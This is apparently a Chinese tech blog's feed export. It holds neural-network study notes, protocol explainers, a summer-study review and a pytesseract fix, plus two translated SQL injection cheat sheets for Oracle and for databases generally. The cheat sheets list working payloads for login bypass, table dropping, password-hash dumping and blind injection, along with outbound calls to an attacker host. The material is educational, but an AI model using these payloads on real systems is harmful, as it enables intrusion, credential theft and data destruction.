			<pubDate>Fri, 04 Mar 2016 20:44:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/ideas-for-neural-network/</guid>
			<description>Ideas for Neural Network * automatically find and make training set from search engine * the paremeters include: * learning rate * iteration times * regularization term \\(\\lambda\\) * activation function * number of hidden layers(units) About MCS, maybe we can train a model for fusion method to do the judge.</description>
			<content type="html"><![CDATA[<h1 id="ideas-for-neural-network">Ideas for Neural Network</h1>
<!-- raw HTML omitted -->
<pre><code>*   automatically find and make training set from search engine
*   the paremeters include:
    
    *   learning rate
    *   iteration times
    *   regularization term \\(\\lambda\\)
    *   activation function
    *   number of hidden layers(units)
</code></pre>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<ul>
<li>About MCS, maybe we can train a model for fusion method to do the judge.</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>Notes for Neural Network</title>
			<link>https://yinzo.github.io/posts/notes-for-neural-network/</link>
			<pubDate>Thu, 03 Mar 2016 00:57:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/notes-for-neural-network/</guid>
			<description>Notes for Neural Network If we set the initial \\(\\Theta\\) be the same, the units in next layer with the same \\(x\_i\\) will get the same result, then all units in the same layer will get the same output. At last, the cost function will also get same cost, so we will update the \\(\\Theta\\) with same step. seems \\(\\delta^{(l)}\_{i}\\) means the cost of \\(i\_{th}\\) unit in the \\(l\_{th}\\) layer</description>
			<content type="html"><![CDATA[<h1 id="notes-for-neural-network">Notes for Neural Network</h1>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<pre><code>If we set the initial \\(\\Theta\\) be the same, the units in next layer with the same \\(x\_i\\) will get the same result, then all units in the same layer will get the same output. At last, the cost function will also get same cost, so we will update the \\(\\Theta\\) with same step.
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>seems \\(\\delta^{(l)}\_{i}\\) means the cost of \\(i\_{th}\\) unit in the \\(l\_{th}\\) layer
</code></pre>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>How to decide the iteration times</p>
</li>
<li>
<p>How to initialize the weight \(w_i\)</p>
<ul>
<li>solved. random initialized. But still didn’t fully understand the formula。</li>
</ul>
</li>
<li>
<p>How to choose the learning rate \(\alpha\)</p>
</li>
<li>
<p>How to choose the activation function</p>
<ul>
<li>what’s the different between sigmoid and other functions.</li>
</ul>
</li>
<li>
<p>How to decision the number of hidden layers and the number of the units in hidden layers</p>
<ul>
<li>simply explained. Mostly take 3 layers, and the hidden layers usually take a fixed number of units.</li>
</ul>
</li>
<li>
<p>What the \(\Delta^{(i)}\) does in the \(\Theta^{(i)}\) updating.</p>
</li>
<li>
<p>What Back Propagation algorithm does in the training process? It is only used to calculate the partial derivatives of Cost Function that used to update the \(\Theta\)?</p>
</li>
<li>
<p>Why every article about NN mentions that Perceptron can finish logical operations? Is there some theory about with logical operation we can simulate the human brain or sth?</p>
</li>
</ul>
<!-- raw HTML omitted -->
<p>We can simply divide this into 2 part:</p>
<ol>
<li>
<p>Train the \(\Theta\) for the MLP.</p>
</li>
<li>
<p>Use the trained \(\Theta\) to predict the input’s classification.</p>
</li>
<li>
<p>The second part is much more easier, let’s first assume that we already have a set of trained \(\Theta\) , and we are now trying to use these \(\Theta\) to predict a testing samples.</p>
<p><strong>The thing you need to do is just:</strong></p>
<ol>
<li>Multiply the input \(X\) with each layer’s \(\Theta\)</li>
<li>Do some small fixed in it (adding bias, choose the most possible option e.t.c.)</li>
</ol>
<p><strong>And you can get the prediction! What an easy job!</strong></p>
</li>
<li>
<p>Then, we are now facing the training part</p>
<ol>
<li>First randomly initialized the \(\Theta\). (Why we don’t simply use 1 or 0? Read this!)</li>
<li>Build a function that we can calculate the difference between our prediction and the fact. We call it Cost Function, and use it to evaluate our prediction.</li>
<li>Then, take that Cost Function as a measurement, we use a searching algorithm (i.e. Gradient Descents), to find out the best \(\Theta\) which could minimized the Cost.</li>
</ol>
</li>
</ol>
]]></content>
		</item>
		
		<item>
			<title>封装，与协议的分层</title>
			<link>https://yinzo.github.io/posts/%E5%B0%81%E8%A3%85%E4%B8%8E%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%86%E5%B1%82/</link>
			<pubDate>Fri, 29 Jan 2016 18:41:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%B0%81%E8%A3%85%E4%B8%8E%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%86%E5%B1%82/</guid>
			<description>封装，与协议的分层 要理解协议的分层，若是了解编程理念中的『封装』，可能更有助于理解分层的意义。 『封装』，狭义上指的是编写程序时，通过把一些重</description>
			<content type="html"><![CDATA[<h1 id="封装与协议的分层">封装，与协议的分层</h1>
<!-- raw HTML omitted -->
<p>要理解协议的分层，若是了解编程理念中的『封装』，可能更有助于理解分层的意义。</p>
<p>『封装』，狭义上指的是编写程序时，通过把一些重复操作的代码写成一个单独的函数，这就可以叫做一个简单的封装。</p>
<p>而我对于封装的理解，举个例子，当你忙了一天回到家，站在你的家门口，想要打开你家的房门时，你需要做以下事情：</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>步骤很多，对不对。不过这个描述也没错，我们的确需要做出这些步骤才能开门。</p>
<p>但是，我们和别人聊天的时候，你想要告诉别人你昨天很累，回到家马上就睡觉了，你会说『昨天我回到家门口，<strong>掏出钥匙，找到对应的钥匙……</strong>』吗？</p>
<p>我想大部分人都不会的。</p>
<p>我会说『昨天我回到家门口，<strong>打开门</strong>，马上就进到卧室睡觉了』，这实际上就是一个封装，我们把这些步骤封装成了一个『开门』的步骤。</p>
<p>看到这里你可能已经大概感觉到了，封装，实际上是把一些步骤，打包整合，使它变成了更高层次的行为。看到这里，我觉得我们应该停下来，多思考一会儿关于封装的概念，毕竟这个概念对于理解后面的协议分层非常关键，所以，让我们暂时停一下脚步，来观察并思考一下，我们日常生活中，还有哪些东西实际上也是一种封装吧。</p>
]]></content>
		</item>
		
		<item>
			<title>网络协议</title>
			<link>https://yinzo.github.io/posts/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</link>
			<pubDate>Fri, 29 Jan 2016 18:40:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</guid>
			<description>网络协议 比如：一个工作需要经过三个步骤，分别是步骤A/步骤B/步骤C。三个步骤分别由三台不同的计算机A/B/C执行。 起初，人们使用容量极小的</description>
			<content type="html"><![CDATA[<h1 id="网络协议">网络协议</h1>
<!-- raw HTML omitted -->
<p>比如：一个工作需要经过三个步骤，分别是步骤A/步骤B/步骤C。三个步骤分别由三台不同的计算机A/B/C执行。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>起初，人们使用容量极小的3.5寸盘，带着要处理的数据来到计算机A面前，执行完之后带着数据分别去B和C前进行操作处理，十分的低效。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>使用网络连接三台计算机之后，用户可以在A处理完数据，直接传递给B和C进行处理，再将处理结果传回A即可。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>甚至，进一步的发展之后，用户都拥有了自己的计算机，则用户可以在任意一台连接了A的计算机上，比如自己的电脑，直接将数据传递到A、B、C计算机上处理，而无需离开自己的计算机进行操作。这一步的发展，即是当前的互联网。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>但是现实中，计算机不仅只由一家公司开发，不同公司的计算机起初只能与自家的计算机进行连接。不同种的计算机无法进行连接交流。就像语言不通的外国人，无法交流。</p>
<p>于是，为了连接不同种类计算机，我们统一了计算机交流的语言。由此，无论你的结构与其他计算机有多不同，只要能够使用这种统一语言，就能加入到互联网这个大聊天室之中，与任何计算机进行通信交流。</p>
<p>这种统一的语言，就是『协议』。</p>
<p>由于各种机缘巧合，TCP/IP协议成为了世界上主流的网络通信协议。</p>
]]></content>
		</item>
		
		<item>
			<title>2015暑假</title>
			<link>https://yinzo.github.io/posts/2015%E6%9A%91%E5%81%87/</link>
			<pubDate>Wed, 02 Sep 2015 22:03:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/2015%E6%9A%91%E5%81%87/</guid>
			<description>2015暑假 正式开始学习技术以来的第二个暑假了，上一个暑假的效率之高，可能没有什么机遇的话挺难超越的了。 先放一张这次暑假一开始的计划图以及其</description>
			<content type="html"><![CDATA[<h1 id="2015暑假">2015暑假</h1>
<!-- raw HTML omitted -->
<p>正式开始学习技术以来的第二个暑假了，上一个暑假的效率之高，可能没有什么机遇的话挺难超越的了。</p>
<p>先放一张这次暑假一开始的计划图以及其完成度。<br>
<img src="http://ww4.sinaimg.cn/large/7d52f1ffgw1evo7tmpg20j20m507i3zp.jpg" alt="暑假计划"></p>
<p>接下来一一说明</p>
<ol>
<li>暑假开始，第一个进行的是SmartQQBot的重构。这时已经回到了家中，主要都是在家里的42寸上完成的，效率不算太高，一个星期3K行左右的Python，主要时间花费在程序模块化逻辑的思考，以及优化二次开发流程上。</li>
<li>接下来，开始花了两天的零散时间整理归纳了自己当前（当时）的技能树，里面漏掉了后端部分中的NodeJS枝，不过也不算很熟练，只是基本入门写了个小东西的水平，也就不追加到博文里了。</li>
<li>深入学习Python。这一部分有少量在重构SmartQQBot的时候就开始了，主要使用<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000">廖雪峰的Python2.7教程</a>以及<a href="https://docs.python.org/2/">Python Documentation</a>，之所以没有标记为完成是因为没有固定的标准，在我看来Python值得我深入的地方还有很多，所以我选择标记为未完成。</li>
<li>预习下学期内容。这个部分其实算是坑掉了，因为到后期时间不多、精力不够（懒）的原因，只看完了《啊哈！算法》并用Python实现了部分算法就没有深入下去了。</li>
<li>深入学习SQL注入。主要使用Drops的大量注入相关文章，配合DVWA手工注入练习。基本了解了SQL注入的一些原理。（盲注还没来得及下手测试）期间在查阅资料的过程中顺手翻译了两篇文章，发到了Drops捞了一笔。标注为未完成的理由同Python。</li>
<li>Cookie-Pot这个项目被我意外的坑掉了。因为在深入了Python和注入之后，发现自己对于前端的内容是越来越不感兴趣了。这样看来我未来的方向里已经排除掉了前端，顶多作为个人爱好再发展发展了。</li>
<li>之后剩余了2周左右的时间，基本都在慢慢看《数学之美》。原本以为两周能看完的，但是里面NLP的部分完全理解需要的概率论知识我都不太记得了，而且课本没带回家，所以进度非常慢，算法理解度也不甚理想。</li>
</ol>
<p>除了以上计划中的内容，我还进行了以下活动</p>
<ol>
<li>暑假刚开始还没回家的两个星期。在学校接了一（两）单前端外包，大概也是因此对前端失去了部分兴趣。</li>
<li>帮一个师兄的项目写了个简易的前端，算是第一次与他人合作进行配合开发。以前都是自己规划自己写后端自己写前端，没有太多与人合作开发的经历。（这个仍在进行）</li>
</ol>
<p>大概就是以上所写的内容了，可能有所遗漏，之后想起来再补充。</p>
<p>啊对了，回学校之后还修证了一下博客的样式;D，新样式简洁多了</p>
<p>总的来说效率算中上，完成度为80%。新的学期也有新的目标，希望能够尽快成长为能够实现自己脑中所有构思的人。</p>
<p><img src="http://ww4.sinaimg.cn/mw690/7d52f1ffgw1evo7to77eaj21kw16o10g.jpg" alt="环境"></p>
<p>2015.09.02</p>
]]></content>
		</item>
		
		<item>
			<title>Oracle注入速查表</title>
			<link>https://yinzo.github.io/posts/oracle%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</link>
			<pubDate>Fri, 28 Aug 2015 17:30:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/oracle%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</guid>
			<description>Oracle注入速查表 注：下面的一部分查询只能由admin执行，我会在查询的末尾以&amp;rdquo;-priv“标注。 探测版本： SELECT banner FROM v$version WHERE banner LIKE ‘</description>
			<content type="html"><![CDATA[<h1 id="oracle注入速查表">Oracle注入速查表</h1>
<!-- raw HTML omitted -->
<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&rdquo;<strong><code>-priv</code></strong>“标注。</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>探测版本：</p>
<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
SELECT version FROM v$instance;
</code></pre>
<p>注释：</p>
<pre><code>SELECT 1 FROM dual — comment
</code></pre>
<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>
<p>当前用户：</p>
<pre><code>SELECT user FROM dual
</code></pre>
<p>列出所有用户：</p>
<pre><code>SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — priv
</code></pre>
<p>列出密码哈希：</p>
<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &amp;lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
SELECT name,spare4 FROM sys.user$ — priv, 11g
</code></pre>
<p>密码破解：</p>
<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>
<p>列出权限：</p>
<pre><code>SELECT * FROM session_privs; —当前用户的权限
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
</code></pre>
<p>列出DBA账户：</p>
<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
</code></pre>
<p>当前数据库：</p>
<pre><code>SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;
</code></pre>
<p>列出数据库：</p>
<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
</code></pre>
<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>
<p>列出字段名：</p>
<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
</code></pre>
<p>列出表名：</p>
<pre><code>SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
</code></pre>
<p>通过字段名找到对应表：</p>
<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
</code></pre>
<p>— 注: 表名都是大写</p>
<p>查询第N行：</p>
<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
</code></pre>
<p>查询第N个字符：</p>
<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
</code></pre>
<p>按位与(Bitwise AND)：</p>
<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
SELECT bitand(6,1) FROM dual; — 返回0
</code></pre>
<p>ASCII值转字符：</p>
<pre><code>SELECT chr(65) FROM dual; — 返回A
</code></pre>
<p>字符转ASCII码：</p>
<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
</code></pre>
<p>类型转换：</p>
<pre><code>SELECT CAST(1 AS char) FROM dual;
SELECT CAST(’1′ AS int) FROM dual;
</code></pre>
<p>拼接字符：</p>
<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
</code></pre>
<p>IF语句：</p>
<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
</code></pre>
<p>— 跟SELECT语句在一起时不太管用</p>
<p>Case语句：</p>
<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
</code></pre>
<p>绕过引号：</p>
<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
</code></pre>
<p>延时：</p>
<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
</code></pre>
<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>
<p>发送DNS请求：</p>
<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
</code></pre>
<p>命令执行：</p>
<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>
<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>
<p>本地文件读取：</p>
<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>
<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
</code></pre>
<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>
<p>主机名称、IP地址：</p>
<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
</code></pre>
<p>定位DB文件：</p>
<pre><code>SELECT name FROM V$DATAFILE;
</code></pre>
<p>默认系统和数据库：</p>
<pre><code>SYSTEM
SYSAUX
</code></pre>
<!-- raw HTML omitted -->
<p>一个字符串列出所有表名：</p>
<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables 
</code></pre>
<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>
<p>盲注排序：</p>
<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
</code></pre>
<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>
]]></content>
		</item>
		
		<item>
			<title>解决Python的pytesseract库执行时报错</title>
			<link>https://yinzo.github.io/posts/%E8%A7%A3%E5%86%B3python%E7%9A%84pytesseract%E5%BA%93%E6%89%A7%E8%A1%8C%E6%97%B6%E6%8A%A5%E9%94%99/</link>
			<pubDate>Sun, 23 Aug 2015 01:42:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E8%A7%A3%E5%86%B3python%E7%9A%84pytesseract%E5%BA%93%E6%89%A7%E8%A1%8C%E6%97%B6%E6%8A%A5%E9%94%99/</guid>
			<description>解决Python的pytesseract库执行时报错 AttributeError: &#39;NoneType&#39; object has no attribute &#39;bands&#39; 修改PIL库site-packages/PIL/Image.py1496行</description>
			<content type="html"><![CDATA[<h1 id="解决python的pytesseract库执行时报错">解决Python的pytesseract库执行时报错</h1>
<!-- raw HTML omitted -->
<pre><code>AttributeError: 'NoneType' object has no attribute 'bands'
</code></pre>
<p>修改PIL库<code>site-packages/PIL/Image.py</code>1496行</p>
<pre><code>def split(self):
    “Split image into bands”

    if self.im.bands == 1:
</code></pre>
<p>为</p>
<pre><code>def split(self):
    “Split image into bands”
    self.load()
    if self.im.bands == 1:
</code></pre>
<p>即可。</p>
]]></content>
		</item>
		
		<item>
			<title>SQL注入速查表</title>
			<link>https://yinzo.github.io/posts/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</link>
			<pubDate>Mon, 10 Aug 2015 17:30:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</guid>
			<description>SQL注入速查表 _文档版本：1.4_现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大</description>
			<content type="html"><![CDATA[<h1 id="sql注入速查表">SQL注入速查表</h1>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted -->_文档版本：1.4_<!-- raw HTML omitted --></p>
<!-- raw HTML omitted -->
<p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p>
<p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<ul>
<li>M: MySQL</li>
<li>S: SQL Server</li>
<li>P: PostgreSQL</li>
<li>O: Oracle</li>
<li>+: (大概)其他所有数据库</li>
</ul>
<p><em>例子</em>：</p>
<ul>
<li>(MS) 代表 : MySQL 和 SQL Server 等</li>
<li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li>
</ul>
<!-- raw HTML omitted -->
<ol>
<li>关于SQL注入速查表</li>
<li>语法参考，攻击样例以及注入小技巧
​
<ol>
<li>
<p>行间注释</p>
</li>
<li>
<p>使用了行间注释的SQL注入攻击样例</p>
</li>
<li>
<p>行内注释</p>
</li>
<li>
<p>使用了行内注释的注入攻击样例</p>
</li>
<li>
<p>MySQL版本探测攻击样例</p>
</li>
<li>
<p>堆叠查询(Stacking Queries)</p>
</li>
<li>
<p>支持堆叠查询的语言/数据库</p>
</li>
<li>
<p>关于MySQL和PHP</p>
</li>
<li>
<p>堆叠注入攻击样例</p>
</li>
<li>
<p>If语句</p>
</li>
<li>
<p>MySQL的If语句</p>
</li>
<li>
<p>SQL Server的If语句</p>
</li>
<li>
<p>使用了If语句的注入攻击样例</p>
</li>
<li>
<p>整数(Integers)的使用</p>
</li>
<li>
<p>字符串操作</p>
</li>
<li>
<p>字符串的串联</p>
</li>
<li>
<p>没有引号的字符串</p>
</li>
<li>
<p>使用了16进制的注入攻击样例</p>
</li>
<li>
<p>字符串异化(Modification)与联系</p>
</li>
<li>
<p>Union注入</p>
</li>
<li>
<p>UNION-语言问题处理</p>
</li>
<li>
<p>绕过登陆界面(SMO+)</p>
</li>
<li>
<p>绕过检查MD5哈希的登陆界面</p>
</li>
<li>
<p>绕过MD5哈希检查的例子(MSP)</p>
</li>
<li>
<p>基于错误(Error Based)-探测字段名</p>
</li>
<li>
<p>使用<code>HAVING</code>来探测字段名(S)</p>
</li>
<li>
<p>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</p>
</li>
<li>
<p>数据类型、UNION、之类的</p>
</li>
<li>
<p>获取字段类型</p>
</li>
<li>
<p>简单的注入(MSO+)</p>
</li>
<li>
<p>有用的函数、信息收集、内置程序、大量注入笔记</p>
</li>
<li>
<p><code>@@version</code>(MS)</p>
</li>
<li>
<p>文件插入(Bulk Insert)(S)</p>
</li>
<li>
<p>BCP(S)</p>
</li>
<li>
<p>SQL Server的VBS/WSH(S)</p>
</li>
<li>
<p>执行系统命令，xp_cmdshell(S)</p>
</li>
<li>
<p>SQL Server中的一些特殊的表(S)</p>
</li>
<li>
<p>SQL Server的其它内置程序(S)</p>
</li>
<li>
<p>大量MSSQL笔记</p>
</li>
<li>
<p>使用LIMIT(M)或ORDER(MSO)的注入</p>
</li>
<li>
<p>关掉SQL Server(S)</p>
</li>
<li>
<p>在SQL Server 2005中启用xp_cmdshell</p>
</li>
<li>
<p>探测SQL Server数据库的结构(S)</p>
</li>
<li>
<p>获取用户定义表</p>
</li>
<li>
<p>获取字段名</p>
</li>
<li>
<p>移动记录(Moving records)(S)</p>
</li>
<li>
<p>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</p>
</li>
<li>
<p>盲注</p>
</li>
<li>
<p>关于盲注</p>
</li>
<li>
<p>实战中的盲注实例</p>
</li>
<li>
<p>延时盲注</p>
</li>
<li>
<p><code>WAITFOR DELAY [time]</code>(S)</p>
</li>
<li>
<p>实例</p>
</li>
<li>
<p><code>BENCHMARK()</code>(M)</p>
</li>
<li>
<p>实例</p>
</li>
<li>
<p><code>pg_sleep(seconds)</code>(P)</p>
</li>
<li>
<p>掩盖痕迹</p>
</li>
<li>
<p><code>-sp_password log bypass</code>(S)</p>
</li>
<li>
<p>注入测试</p>
</li>
<li>
<p>一些其他的MySQL笔记</p>
</li>
<li>
<p>MySQL中好用的函数</p>
</li>
<li>
<p>SQL注入的高级使用</p>
</li>
<li>
<p>强制SQL Server来得到NTLM哈希</p>
</li>
<li>
<p>Bulk insert UNC共享文件 (S)</p>
</li>
</ol>
</li>
</ol>
<p>​ <br>
3.   待办事项 / 联系方式 / 帮助</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><strong>注释掉查询语句的其余部分</strong><br>
行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p>
<ul>
<li></li>
</ul>
<p><code>--</code>(SM)</p>
<p><code>DROP sampletable;--</code></p>
<ul>
<li></li>
</ul>
<p><code>#</code>(M)</p>
<p><code>DROP sampletable;#</code></p>
<!-- raw HTML omitted -->
<blockquote>
<p>用户名:<code>admin'--</code></p>
</blockquote>
<ul>
<li>构成语句:<code>SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'</code>这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li>
</ul>
<!-- raw HTML omitted -->
<p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于__绕过过滤__，移除空格，混淆，或探测数据库版本。</p>
<ul>
<li>
<p><code>/*注释内容*/</code>(SM)</p>
<ul>
<li><code>DROP/*comment*/sampletable</code></li>
<li><code>DR/**/OP/*绕过过滤*/sampletable</code></li>
<li><code>SELECT/*替换空格*/password/**/FROM/**/Members</code></li>
</ul>
</li>
<li>
<p><code>/*! MYSQL专属 */</code> (M)</p>
<p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br>
<code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p>
</li>
</ul>
<!-- raw HTML omitted -->
<blockquote>
<p>ID:<code>10; DROP TABLE members /*</code></p>
</blockquote>
<p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members --</code></p>
<!-- raw HTML omitted -->
<blockquote>
<p><code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p>
</blockquote>
<p>如果MySQL的版本高于__3.23.02__，会抛出一个<code>division by 0 error</code></p>
<blockquote>
<p>ID:<code>/*!32302 10*/</code></p>
<p>ID:<code>10</code></p>
</blockquote>
<p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p>
<!-- raw HTML omitted -->
<p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>
<ul>
<li><code>;</code>(S)<code>SELECT * FROM members; DROP members--</code>结束一个查询并开始一个新的查询</li>
</ul>
<!-- raw HTML omitted -->
<p>__绿色：__支持，__暗灰色：__不支持，__浅灰色：__未知<br>
<img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg" alt="支持堆叠查询的语言/数据库"></p>
<!-- raw HTML omitted -->
<p>阐明一些问题。</p>
<p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p>
<p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p>
<!-- raw HTML omitted -->
<blockquote>
<p>ID:<code>10;DROP members --</code></p>
</blockquote>
<p>构成语句：<code>SELECT * FROM products WHERE id = 10; DROP members--</code></p>
<p>这在执行完正常查询之后将会执行DROP查询。</p>
<!-- raw HTML omitted -->
<p>根据If语句得到响应。这是__盲注(Blind SQL Injection)的关键之一__，同样也能简单而__准确地__进行一些测试。</p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<pre><code>`` IF(condition,true-part,false-part) ``(M)

&gt;  
</code></pre>
<blockquote>
<pre><code>`` SELECT IF (1=1,'true','false') ``
</code></pre>
</blockquote>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<pre><code>`` IF condition true-part ELSE false-part ``(S)

&gt;  
</code></pre>
<blockquote>
<pre><code>`` IF (1=1) SELECT 'true' ELSE SELECT 'false' ``
</code></pre>
</blockquote>
<!-- raw HTML omitted -->
<blockquote>
<p><code>if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0</code>(S)</p>
</blockquote>
<p>如果当前用户不是__“sa&quot;或者&quot;dbo”__,就会抛出一个__<code>divide by zero error</code>__。</p>
<!-- raw HTML omitted -->
<p>对于绕过十分有用，比如__magic_quotes() 和其他类似过滤器__，甚至是各种WAF。</p>
<ul>
<li></li>
</ul>
